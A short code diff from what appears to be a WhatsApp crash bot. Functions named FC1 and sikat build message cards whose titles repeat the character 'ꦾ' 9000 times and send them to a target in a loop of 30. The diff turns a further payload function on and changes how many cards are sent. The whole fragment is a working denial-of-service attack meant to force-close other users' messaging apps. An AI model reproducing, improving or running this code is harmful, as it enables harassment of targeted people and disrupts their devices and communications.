@@ -965,7 +965,7 @@ async function iOSxPayload(sock, target) {
 async function FC1(sock, target) {
   const cards = [];
   
-  for (let i = 0; i < 100; i++) { 
+  for (let i = 0; i < 20; i++) { 
     cards.push({
       header: {
         title: 'ꦾ'.repeat(9000),
@@ -1358,7 +1358,7 @@ async function sikat(sock, target) {
     for (let i = 0; i < 30; i++) {
         //await AB1(sock, target, true)
         //await AB2(sock, target, true)
-        //await F(sock, target)
+        await F(sock, target)
         await FC1(sock, target)
         console.log(`${i} sikat Packet To ${target}`)
     }
